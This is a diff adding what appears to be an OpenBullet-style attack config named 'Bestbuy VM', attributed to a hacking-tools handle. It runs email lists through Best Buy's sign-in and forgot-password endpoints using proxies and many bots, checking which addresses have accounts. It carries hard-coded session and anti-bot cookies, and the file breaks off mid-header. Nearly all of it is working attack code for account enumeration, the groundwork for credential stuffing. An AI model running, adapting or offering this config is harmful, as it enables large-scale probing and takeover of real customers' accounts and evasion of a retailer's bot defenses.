@@ -1,0 +1,138 @@
+[SETTINGS]
+{
+  "Name": "Bestbuy VM(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-08T05:11:47.5313063+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.bestbuy.com/" 
+  
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6" 
+  HEADER "cookie: CTT=8b8e5e49da5e66d7368f18852915ebd7; oid=1923774070; vt=993c29a7-1501-11ec-8ec3-12cb818de8e3; __gads=ID=24f5c395f52ee720:T=1631585727:S=ALNI_MZMD5w6Vdwqv6UGm4s9Hw-qzhiBCg; UID=ce639ca3-d332-46cf-9b63-57a6fb56bf3b; ui=1631585733358; G_ENABLED_IDPS=google; s_ecid=MCMID%7C45356559242369626773221974033847635761; 52245=; aam_uuid=40226832791408727912707879955627730451; locDestZip=00840; locStoreId=1118; sc-location-v2=%7B%22meta%22%3A%7B%22CreatedAt%22%3A%222021-09-16T06%3A39%3A13.839Z%22%2C%22ModifiedAt%22%3A%222021-09-16T06%3A39%3A13.904Z%22%2C%22ExpiresAt%22%3A%222022-09-16T06%3A39%3A13.904Z%22%7D%2C%22value%22%3A%22%7B%5C%22physical%5C%22%3A%7B%5C%22zipCode%5C%22%3A%5C%2200840%5C%22%2C%5C%22source%5C%22%3A%5C%22A%5C%22%2C%5C%22captureTime%5C%22%3A%5C%222021-09-16T06%3A39%3A13.836Z%5C%22%7D%2C%5C%22destination%5C%22%3A%7B%5C%22zipCode%5C%22%3A%5C%2200840%5C%22%7D%2C%5C%22store%5C%22%3A%7B%5C%22storeId%5C%22%3A1118%2C%5C%22zipCode%5C%22%3A%5C%2200918%5C%22%2C%5C%22storeHydratedCaptureTime%5C%22%3A%5C%222021-09-16T06%3A39%3A13.904Z%5C%22%7D%7D%22%7D; pst2=482|N; partner=198%26HyperX%262021-09-17+22%3a48%3a12.000; sto__vuid=915dde226361928c9c002a0a74da51b0; _cs_c=1; _gcl_au=1.1.1090417673.1631936916; physical_dma=501; customerZipCode=10001|N; ltc=%20; bby_rdp=l; SID=8c280937-3895-448e-94e2-1349f9710822; bm_sz=E7027C49839DF5C5557A997A7C49C7DF~YAAQR6omF972Hrt6AQAA5aFJBg1CcDFFmghvfJaEGFQ/j0HcfRGjhSfkTyVizgw6fV23UQ5wwz56AnMHkjmv0vBAQlgbPY/D7AIEAktH0yaL/+jWWVLVpe+pXBQjFASn6yz4iKG1Y5zuVSEjMLR02ifTA9JzcG0rLM7BHz6smcEWJLmK5WW4D6rqnob2RoK/BXJjHnVP90VRFWB0Rh2+IXqQP3xwErLFQj/Y2XaCy6NI4oVygBB34nBzRNcdxxA4AnWRGBdV/0OqZEmqT7i4sTq7eNqEiqwLgqbfD87yedVu7zu9LUKlOTUtXMbO1lML64kfFCKKSxkMExZtIyiXXnjvnk8ZdWhpjAT0jvlfgtfp5AkDSSCwaa9CjcZ+9+NprFzZEqo7bRv7IUJvMQmcGA==~3486777~3424821; rxVisitor=1632193063576SV618B1DJI5SQEQ98UGP5CA0F6MK018C; lux_uid=163219306360625058; c6db37d7c8add47f1af93cf219c2c682=7788317e5378f72f618dbde095ca59a3; COM_TEST_FIX=2021-09-21T02%3A57%3A47.705Z; AMCVS_F6301253512D2BDB0A490D45%40AdobeOrg=1; AMCV_F6301253512D2BDB0A490D45%40AdobeOrg=1585540135%7CMCMID%7C45356559242369626773221974033847635761%7CMCAID%7CNONE%7CMCOPTOUT-1632200292s%7CNONE%7CMCAAMLH-1632797892%7C7%7CMCAAMB-1632797892%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI%7CMCCIDH%7C504350016%7CvVersion%7C4.4.0; _cs_mk=0.9322285860684838_1632193092214; s_cc=true; ZPLANK=60f9322a1d154593880953a8e1d28d6b; _abck=7AE10719B079A7FD42267C7EB1235A6B~0~YAAQLHR+aKZm71l7AQAA22BQBgbNu3UCq1wP8WxGcLBVyJkI/fGlXLcXQlfclSBwziqyuqsbK91pp+l8fWOpoT7RoipN1FmisrhTNGOhCFaHBXICTaP5nlQOTptf8ODU+Kfq1FtvpWCKLVbjVWUOE7uvvsUzXYfkgP1FCwjOANhGIEGiPMLlVHQEVAU6B4FyXZvb6Us8zWGaDc0KGXZ4wZ6+/k3NMH73P1otmkEUcvTzSSG73205pcxWeztJ88iSGiA+/LdvyF8H39HgqFMar0u2xGOZagSd39PrYZtFChUCHE6CpUiHBIjIo7giiT7AMPDNs4aSRilPGbc8/D0Lo90/LQWqkgiAvV4ofScPgPUlViVSBvYjIcSPBMwzXpDCt39NWyG5OmE8LY5DJffntJtgLzUo3JruNpPYbtiGNUrHGJTFfg7PXbAuJLB9DgYxHLF3VXx8rJA=~-1~-1~-1; bby_cbc_lb=p-browse-e; basketTimestamp=1632193684961; dtCookie=v_4_srv_2_sn_VC3VOHTSJPAQOU3AVFIMKJP9ARV2DLR6_app-3Aea7c4b59f27d43eb_1_app-3A1531b71cca36e130_1_app-3A1b02c17e3de73d2a_1_ol_0_perc_100000_mul_1; bby_prc_lb=p-prc-e; s_sq=%5B%5BB%5D%5D; bby_idn_lb=p-idn-cloud; c2=Best%20Buy; dtSa=-; cto_bundle=s_5KzV9PRUdGMlp6JTJGYzZGZjFwTWw2VjRCZCUyRk9ZNVFxJTJGT0FHQmd2aEdjQzdZOWZhWmRyZFlPMVVBJTJCdzBLRnNZWUwwc01VQ0xUb010aXBEZEVIbGQ1ZFF1Q0M3bjNrTElPN25oN2ZWODlYc1EzTm5yc2JvWmR6UW5yVXFGN1FMZXhBSW5Ic0ZDbEF2NGQlMkJKJTJGVG9wOER0endwQXclM0QlM0Q; rxvt=1632195606352|1632193063580; dtPC=2$193793224_550h-vHQTPDRGWCIAUAKQFDRFHSWSMHWLMKUPL-0e8; dtLatC=2; _cs_id=40b6cb86-fc2e-a7fd-ba2c-1bea93e918dc.1631936914.2.1632193815.1632193087.1614963257.1666100914848.Lax.0; _cs_s=2.1" 
+  HEADER "sec-ch-ua: \"Microsoft Edge\";v=\"93\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"93\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: none" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 Edg/93.0.961.52" 
+
+PARSE "<COOKIES(_abck)>" LR "" "" -> VAR "_abck" 
+
+REQUEST GET "https://www.bestbuy.com/identity/global/signin" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6" 
+  HEADER "cookie: CTT=8b8e5e49da5e66d7368f18852915ebd7; oid=1923774070; vt=993c29a7-1501-11ec-8ec3-12cb818de8e3; __gads=ID=24f5c395f52ee720:T=1631585727:S=ALNI_MZMD5w6Vdwqv6UGm4s9Hw-qzhiBCg; UID=ce639ca3-d332-46cf-9b63-57a6fb56bf3b; ui=1631585733358; G_ENABLED_IDPS=google; s_ecid=MCMID%7C45356559242369626773221974033847635761; 52245=; aam_uuid=40226832791408727912707879955627730451; locDestZip=00840; locStoreId=1118; sc-location-v2=%7B%22meta%22%3A%7B%22CreatedAt%22%3A%222021-09-16T06%3A39%3A13.839Z%22%2C%22ModifiedAt%22%3A%222021-09-16T06%3A39%3A13.904Z%22%2C%22ExpiresAt%22%3A%222022-09-16T06%3A39%3A13.904Z%22%7D%2C%22value%22%3A%22%7B%5C%22physical%5C%22%3A%7B%5C%22zipCode%5C%22%3A%5C%2200840%5C%22%2C%5C%22source%5C%22%3A%5C%22A%5C%22%2C%5C%22captureTime%5C%22%3A%5C%222021-09-16T06%3A39%3A13.836Z%5C%22%7D%2C%5C%22destination%5C%22%3A%7B%5C%22zipCode%5C%22%3A%5C%2200840%5C%22%7D%2C%5C%22store%5C%22%3A%7B%5C%22storeId%5C%22%3A1118%2C%5C%22zipCode%5C%22%3A%5C%2200918%5C%22%2C%5C%22storeHydratedCaptureTime%5C%22%3A%5C%222021-09-16T06%3A39%3A13.904Z%5C%22%7D%7D%22%7D; pst2=482|N; partner=198%26HyperX%262021-09-17+22%3a48%3a12.000; sto__vuid=915dde226361928c9c002a0a74da51b0; _cs_c=1; _gcl_au=1.1.1090417673.1631936916; physical_dma=501; customerZipCode=10001|N; ltc=%20; bby_rdp=l; SID=8c280937-3895-448e-94e2-1349f9710822; bm_sz=E7027C49839DF5C5557A997A7C49C7DF~YAAQR6omF972Hrt6AQAA5aFJBg1CcDFFmghvfJaEGFQ/j0HcfRGjhSfkTyVizgw6fV23UQ5wwz56AnMHkjmv0vBAQlgbPY/D7AIEAktH0yaL/+jWWVLVpe+pXBQjFASn6yz4iKG1Y5zuVSEjMLR02ifTA9JzcG0rLM7BHz6smcEWJLmK5WW4D6rqnob2RoK/BXJjHnVP90VRFWB0Rh2+IXqQP3xwErLFQj/Y2XaCy6NI4oVygBB34nBzRNcdxxA4AnWRGBdV/0OqZEmqT7i4sTq7eNqEiqwLgqbfD87yedVu7zu9LUKlOTUtXMbO1lML64kfFCKKSxkMExZtIyiXXnjvnk8ZdWhpjAT0jvlfgtfp5AkDSSCwaa9CjcZ+9+NprFzZEqo7bRv7IUJvMQmcGA==~3486777~3424821; rxVisitor=1632193063576SV618B1DJI5SQEQ98UGP5CA0F6MK018C; lux_uid=163219306360625058; c6db37d7c8add47f1af93cf219c2c682=7788317e5378f72f618dbde095ca59a3; COM_TEST_FIX=2021-09-21T02%3A57%3A47.705Z; AMCVS_F6301253512D2BDB0A490D45%40AdobeOrg=1; AMCV_F6301253512D2BDB0A490D45%40AdobeOrg=1585540135%7CMCMID%7C45356559242369626773221974033847635761%7CMCAID%7CNONE%7CMCOPTOUT-1632200292s%7CNONE%7CMCAAMLH-1632797892%7C7%7CMCAAMB-1632797892%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI%7CMCCIDH%7C504350016%7CvVersion%7C4.4.0; _cs_mk=0.9322285860684838_1632193092214; s_cc=true; ZPLANK=60f9322a1d154593880953a8e1d28d6b; _abck=7AE10719B079A7FD42267C7EB1235A6B~0~YAAQLHR+aKZm71l7AQAA22BQBgbNu3UCq1wP8WxGcLBVyJkI/fGlXLcXQlfclSBwziqyuqsbK91pp+l8fWOpoT7RoipN1FmisrhTNGOhCFaHBXICTaP5nlQOTptf8ODU+Kfq1FtvpWCKLVbjVWUOE7uvvsUzXYfkgP1FCwjOANhGIEGiPMLlVHQEVAU6B4FyXZvb6Us8zWGaDc0KGXZ4wZ6+/k3NMH73P1otmkEUcvTzSSG73205pcxWeztJ88iSGiA+/LdvyF8H39HgqFMar0u2xGOZagSd39PrYZtFChUCHE6CpUiHBIjIo7giiT7AMPDNs4aSRilPGbc8/D0Lo90/LQWqkgiAvV4ofScPgPUlViVSBvYjIcSPBMwzXpDCt39NWyG5OmE8LY5DJffntJtgLzUo3JruNpPYbtiGNUrHGJTFfg7PXbAuJLB9DgYxHLF3VXx8rJA=~-1~-1~-1; basketTimestamp=1632193684961; dtCookie=v_4_srv_2_sn_VC3VOHTSJPAQOU3AVFIMKJP9ARV2DLR6_app-3Aea7c4b59f27d43eb_1_app-3A1531b71cca36e130_1_app-3A1b02c17e3de73d2a_1_ol_0_perc_100000_mul_1; bby_idn_lb=p-idn-cloud; c2=Best%20Buy; dtSa=-; cto_bundle=udPjf19BNXBxU1NRbG84ZWtqbk9haHRlakdKWHhITnBUS1ZTOElKS1AlMkJSaTlzJTJCQmxaQ2tkSVhDcTlISVFJMVJUT1B5OWFFUDUlMkJXSElwRFFVU3I5YiUyRllVbjQzU3plVGhqeXk1aCUyQnA3NTdRam95eGs4NTZOMjNJOWtPR2lOZ1hBNnglMkJTaEQ0YTZXUE1PQyUyQkhOU3gzOUt0TmVLQSUzRCUzRA; rxvt=1632195735304|1632193063580; dtPC=2$193914257_463h-vHQTPDRGWCIAUAKQFDRFHSWSMHWLMKUPL-0e9; _cs_id=40b6cb86-fc2e-a7fd-ba2c-1bea93e918dc.1631936914.2.1632193939.1632193087.1614963257.1666100914848.Lax.0; _cs_s=3.1; dtLatC=3; bby_cbc_lb=p-browse-e; s_sq=bbymainprod%3D%2526pid%253DBest%252520Buy%2526pidt%253D1%2526oid%253Dhttps%25253A%25252F%25252Fwww.bestbuy.com%25252Fidentity%25252Fglobal%25252Fsignin%2526ot%253DA" 
+  HEADER "referer: https://www.bestbuy.com/" 
+  HEADER "sec-ch-ua: \"Microsoft Edge\";v=\"93\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"93\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 Edg/93.0.961.52" 
+
+PARSE "<SOURCE>" LR ",\"token\":\"" "\"," -> VAR "token" 
+
+REQUEST GET "https://www.bestbuy.com/identity/signin/forgotPassword?token=<token>" 
+  
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6" 
+  HEADER "cookie: CTT=8b8e5e49da5e66d7368f18852915ebd7; oid=1923774070; vt=993c29a7-1501-11ec-8ec3-12cb818de8e3; __gads=ID=24f5c395f52ee720:T=1631585727:S=ALNI_MZMD5w6Vdwqv6UGm4s9Hw-qzhiBCg; UID=ce639ca3-d332-46cf-9b63-57a6fb56bf3b; ui=1631585733358; G_ENABLED_IDPS=google; s_ecid=MCMID%7C45356559242369626773221974033847635761; 52245=; aam_uuid=40226832791408727912707879955627730451; locDestZip=00840; locStoreId=1118; sc-location-v2=%7B%22meta%22%3A%7B%22CreatedAt%22%3A%222021-09-16T06%3A39%3A13.839Z%22%2C%22ModifiedAt%22%3A%222021-09-16T06%3A39%3A13.904Z%22%2C%22ExpiresAt%22%3A%222022-09-16T06%3A39%3A13.904Z%22%7D%2C%22value%22%3A%22%7B%5C%22physical%5C%22%3A%7B%5C%22zipCode%5C%22%3A%5C%2200840%5C%22%2C%5C%22source%5C%22%3A%5C%22A%5C%22%2C%5C%22captureTime%5C%22%3A%5C%222021-09-16T06%3A39%3A13.836Z%5C%22%7D%2C%5C%22destination%5C%22%3A%7B%5C%22zipCode%5C%22%3A%5C%2200840%5C%22%7D%2C%5C%22store%5C%22%3A%7B%5C%22storeId%5C%22%3A1118%2C%5C%22zipCode%5C%22%3A%5C%2200918%5C%22%2C%5C%22storeHydratedCaptureTime%5C%22%3A%5C%222021-09-16T06%3A39%3A13.904Z%5C%22%7D%7D%22%7D; pst2=482|N; partner=198%26HyperX%262021-09-17+22%3a48%3a12.000; sto__vuid=915dde226361928c9c002a0a74da51b0; _cs_c=1; _gcl_au=1.1.1090417673.1631936916; physical_dma=501; customerZipCode=10001|N; ltc=%20; bby_rdp=l; SID=8c280937-3895-448e-94e2-1349f9710822; bm_sz=E7027C49839DF5C5557A997A7C49C7DF~YAAQR6omF972Hrt6AQAA5aFJBg1CcDFFmghvfJaEGFQ/j0HcfRGjhSfkTyVizgw6fV23UQ5wwz56AnMHkjmv0vBAQlgbPY/D7AIEAktH0yaL/+jWWVLVpe+pXBQjFASn6yz4iKG1Y5zuVSEjMLR02ifTA9JzcG0rLM7BHz6smcEWJLmK5WW4D6rqnob2RoK/BXJjHnVP90VRFWB0Rh2+IXqQP3xwErLFQj/Y2XaCy6NI4oVygBB34nBzRNcdxxA4AnWRGBdV/0OqZEmqT7i4sTq7eNqEiqwLgqbfD87yedVu7zu9LUKlOTUtXMbO1lML64kfFCKKSxkMExZtIyiXXnjvnk8ZdWhpjAT0jvlfgtfp5AkDSSCwaa9CjcZ+9+NprFzZEqo7bRv7IUJvMQmcGA==~3486777~3424821; rxVisitor=1632193063576SV618B1DJI5SQEQ98UGP5CA0F6MK018C; lux_uid=163219306360625058; c6db37d7c8add47f1af93cf219c2c682=7788317e5378f72f618dbde095ca59a3; COM_TEST_FIX=2021-09-21T02%3A57%3A47.705Z; AMCVS_F6301253512D2BDB0A490D45%40AdobeOrg=1; AMCV_F6301253512D2BDB0A490D45%40AdobeOrg=1585540135%7CMCMID%7C45356559242369626773221974033847635761%7CMCAID%7CNONE%7CMCOPTOUT-1632200292s%7CNONE%7CMCAAMLH-1632797892%7C7%7CMCAAMB-1632797892%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI%7CMCCIDH%7C504350016%7CvVersion%7C4.4.0; _cs_mk=0.9322285860684838_1632193092214; s_cc=true; ZPLANK=60f9322a1d154593880953a8e1d28d6b; _abck=7AE10719B079A7FD42267C7EB1235A6B~0~YAAQLHR+aKZm71l7AQAA22BQBgbNu3UCq1wP8WxGcLBVyJkI/fGlXLcXQlfclSBwziqyuqsbK91pp+l8fWOpoT7RoipN1FmisrhTNGOhCFaHBXICTaP5nlQOTptf8ODU+Kfq1FtvpWCKLVbjVWUOE7uvvsUzXYfkgP1FCwjOANhGIEGiPMLlVHQEVAU6B4FyXZvb6Us8zWGaDc0KGXZ4wZ6+/k3NMH73P1otmkEUcvTzSSG73205pcxWeztJ88iSGiA+/LdvyF8H39HgqFMar0u2xGOZagSd39PrYZtFChUCHE6CpUiHBIjIo7giiT7AMPDNs4aSRilPGbc8/D0Lo90/LQWqkgiAvV4ofScPgPUlViVSBvYjIcSPBMwzXpDCt39NWyG5OmE8LY5DJffntJtgLzUo3JruNpPYbtiGNUrHGJTFfg7PXbAuJLB9DgYxHLF3VXx8rJA=~-1~-1~-1; basketTimestamp=1632193684961; dtCookie=v_4_srv_2_sn_VC3VOHTSJPAQOU3AVFIMKJP9ARV2DLR6_app-3Aea7c4b59f27d43eb_1_app-3A1531b71cca36e130_1_app-3A1b02c17e3de73d2a_1_ol_0_perc_100000_mul_1; bby_idn_lb=p-idn-cloud; c2=Best%20Buy; dtSa=-; cto_bundle=udPjf19BNXBxU1NRbG84ZWtqbk9haHRlakdKWHhITnBUS1ZTOElKS1AlMkJSaTlzJTJCQmxaQ2tkSVhDcTlISVFJMVJUT1B5OWFFUDUlMkJXSElwRFFVU3I5YiUyRllVbjQzU3plVGhqeXk1aCUyQnA3NTdRam95eGs4NTZOMjNJOWtPR2lOZ1hBNnglMkJTaEQ0YTZXUE1PQyUyQkhOU3gzOUt0TmVLQSUzRCUzRA; rxvt=1632195735304|1632193063580; dtPC=2$193914257_463h-vHQTPDRGWCIAUAKQFDRFHSWSMHWLMKUPL-0e9; _cs_id=40b6cb86-fc2e-a7fd-ba2c-1bea93e918dc.1631936914.2.1632193939.1632193087.1614963257.1666100914848.Lax.0; _cs_s=3.1; dtLatC=3; bby_cbc_lb=p-browse-e; s_sq=bbymainprod%3D%2526pid%253DBest%252520Buy%2526pidt%253D1%2526oid%253Dhttps%25253A%25252F%25252Fwww.bestbuy.com%25252Fidentity%25252Fglobal%25252Fsignin%2526ot%253DA" 
+  HEADER "referer: https://www.bestbuy.com/" 
+  HEADER "sec-ch-ua: \"Microsoft Edge\";v=\"93\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"93\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 Edg/93.0.961.52" 
+
+PARSE "<SOURCE>" LR "emailFieldName\":\"" "\"," -> VAR "emailFieldName" 
+
+PARSE "<SOURCE>" LR ",\"token\":\"" "\"," -> VAR "token" 
+
+REQUEST POST "https://www.bestbuy.com/identity/password/email" 
+  CONTENT "{\"token\":\"<token>\",\"flowOptions\":\"0010000000000000\",\"<emailFieldName>\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "cookie: CTT=8b8e5e49da5e66d7368f18852915ebd7; oid=1923774070; vt=993c29a7-1501-11ec-8ec3-12cb818de8e3; __gads=ID=24f5c395f52ee720:T=1631585727:S=ALNI_MZMD5w6Vdwqv6UGm4s9Hw-qzhiBCg; UID=ce639ca3-d332-46cf-9b63-57a6fb56bf3b; ui=1631585733358; G_ENABLED_IDPS=google; s_ecid=MCMID%7C45356559242369626773221974033847635761; 52245=; aam_uuid=40226832791408727912707879955627730451; locDestZip=00840; locStoreId=1118; sc-location-v2=%7B%22meta%22%3A%7B%22CreatedAt%22%3A%222021-09-16T06%3A39%3A13.839Z%22%2C%22ModifiedAt%22%3A%222021-09-16T06%3A39%3A13.904Z%22%2C%22ExpiresAt%22%3A%222022-09-16T06%3A39%3A13.904Z%22%7D%2C%22value%22%3A%22%7B%5C%22physical%5C%22%3A%7B%5C%22zipCode%5C%22%3A%5C%2200840%5C%22%2C%5C%22source%5C%22%3A%5C%22A%5C%22%2C%5C%22captureTime%5C%22%3A%5C%222021-09-16T06%3A39%3A13.836Z%5C%22%7D%2C%5C%22destination%5C%22%3A%7B%5C%22zipCode%5C%22%3A%5C%2200840%5C%22%7D%2C%5C%22store%5C%22%3A%7B%5C%22storeId%5C%22%3A1118%2C%5C%22zipCode%5C%22%3A%5C%2200918%5C%22%2C%5C%22storeHydratedCaptureTime%5C%22%3A%5C%222021-09-16T06%3A39%3A13.904Z%5C%22%7D%7D%22%7D; pst2=482|N; partner=198%26HyperX%262021-09-17+22%3a48%3a12.000; sto__vuid=915dde226361928c9c002a0a74da51b0; _cs_c=1; _gcl_au=1.1.1090417673.1631936916; physical_dma=501; customerZipCode=10001|N; ltc=%20; bby_rdp=l; SID=8c280937-3895-448e-94e2-1349f9710822; bm_sz=E7027C49839DF5C5557A997A7C49C7DF~YAAQR6omF972Hrt6AQAA5aFJBg1CcDFFmghvfJaEGFQ/j0HcfRGjhSfkTyVizgw6fV23UQ5wwz56AnMHkjmv0vBAQlgbPY/D7AIEAktH0yaL/+jWWVLVpe+pXBQjFASn6yz4iKG1Y5zuVSEjMLR02ifTA9JzcG0rLM7BHz6smcEWJLmK5WW4D6rqnob2RoK/BXJjHnVP90VRFWB0Rh2+IXqQP3xwErLFQj/Y2XaCy6NI4oVygBB34nBzRNcdxxA4AnWRGBdV/0OqZEmqT7i4sTq7eNqEiqwLgqbfD87yedVu7zu9LUKlOTUtXMbO1lML64kfFCKKSxkMExZtIyiXXnjvnk8ZdWhpjAT0jvlfgtfp5AkDSSCwaa9CjcZ+9+NprFzZEqo7bRv7IUJvMQmcGA==~3486777~3424821; rxVisitor=1632193063576SV618B1DJI5SQEQ98UGP5CA0F6MK018C; lux_uid=163219306360625058; c6db37d7c8add47f1af93cf219c2c682=7788317e5378f72f618dbde095ca59a3; COM_TEST_FIX=2021-09-21T02%3A57%3A47.705Z; AMCVS_F6301253512D2BDB0A490D45%40AdobeOrg=1; AMCV_F6301253512D2BDB0A490D45%40AdobeOrg=1585540135%7CMCMID%7C45356559242369626773221974033847635761%7CMCAID%7CNONE%7CMCOPTOUT-1632200292s%7CNONE%7CMCAAMLH-1632797892%7C7%7CMCAAMB-1632797892%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI%7CMCCIDH%7C504350016%7CvVersion%7C4.4.0; _cs_mk=0.9322285860684838_1632193092214; s_cc=true; ZPLANK=60f9322a1d154593880953a8e1d28d6b; _abck=<_abck>; basketTimestamp=1632193684961; dtCookie=v_4_srv_2_sn_VC3VOHTSJPAQOU3AVFIMKJP9ARV2DLR6_app-3Aea7c4b59f27d43eb_1_app-3A1531b71cca36e130_1_app-3A1b02c17e3de73d2a_1_ol_0_perc_100000_mul_1; dtSa=-; cto_bundle=udPjf19BNXBxU1NRbG84ZWtqbk9haHRlakdKWHhITnBUS1ZTOElKS1AlMkJSaTlzJTJCQmxaQ2tkSVhDcTlISVFJMVJUT1B5OWFFUDUlMkJXSElwRFFVU3I5YiUyRllVbjQzU3plVGhqeXk1aCUyQnA3NTdRam95eGs4NTZOMjNJOWtPR2lOZ1hBNnglMkJTaEQ0YTZXUE1PQyUyQkhOU3gzOUt0TmVLQSUzRCUzRA; _cs_id=40b6cb86-fc2e-a7fd-ba2c-1bea93e918dc.1631936914.2.1632193939.1632193087.1614963257.1666100914848.Lax.0; _cs_s=3.1; bby_cbc_lb=p-browse-e; rxvt=1632196113422|1632193063580; dtPC=2$194307011_606h-vHQTPDRGWCIAUAKQFDRFHSWSMHWLMKUPL-0e10; dtLatC=1; bby_idn_lb=p-idn-cloud; c2=My%20Account%3A%20Guest%3A%20Sign%20In%20Forgot%20Password; s_sq=bbymainprod%3D%2526pid%253DMy%252520Account%25253A%252520Guest%25253A%252520Sign%252520In%252520Forgot%252520Password%2526pidt%253D1%2526oid%253DContinue%2526oidt%253D3%2526ot%253DSUBMIT" 
+  HEADER "origin: https://www.bestbuy.com" 
+  HEADER "referer: https://www.bestbuy.com/identity/signin/forgotPassword?token=tid%3Ad0615791-1a87-11ec-8836-0e2f7fc8055d" 
+  HEADER "sec-ch-ua: \"Microsoft Edge\";v=\"93\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"93\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 Edg/93.0.961.52" 
+  HEADER "x-grid: 1:cia-grid-v1:PdMntUPrsVZF3rNEzsu5L6HwJLsCJuVllvG56YWb4XrXcFJTsrOVOLEs/DDecZ3Q7lMSN3ZuEFGrlkrpzbweseAqFOWRyRw2iB7MjqQfY97gF6HkhW8KyHihKp6FVgrclOSXahGMxFSmDE568Oy2f+J06/fTxR09q6SO1IWyYydFt/+J3mnZiDjOwLvoQU3fyeVfOVgb//e293HPFvfAZonH0PR2+EF1htS3DXIRwaLp1hYjCKU/ErGCJPKYLA5RytY4q8dC60ge59xDcTqbane6KiOyokUG0iPpfW4+fbj+9hrW5QcpbhT7+Jo9WjdhOthCrW+AbE3/2R4gnaLGhMLQU+DNZTMbCU/TefknnPch+bBens2myzbl+5dK/wDR+UKsFXPaK/B+xtUwkBVwhjEyXQ7mmRZ/0ewsTU7uwTYX5JtKPoNfwckN2O1SVxl4KIaHN+eFc6YZHH2NBA6qblttilbeuMf+D3Ri9NxiFt/J3BUXdrlOAa5wW/AD76OT7QySO8qEGsIR9D3cd5gehA6VHYzLW/+qZqP98sredFFnP5hatQMRYsefC3zTGOXALSkjDdkJbIDIhrGKOj0bIVQ6028v4XaCv0tmhqrTPMFEID2UHn7WASTmoItAg+qE2lyA6g3dBvVQukBVdU4VN/6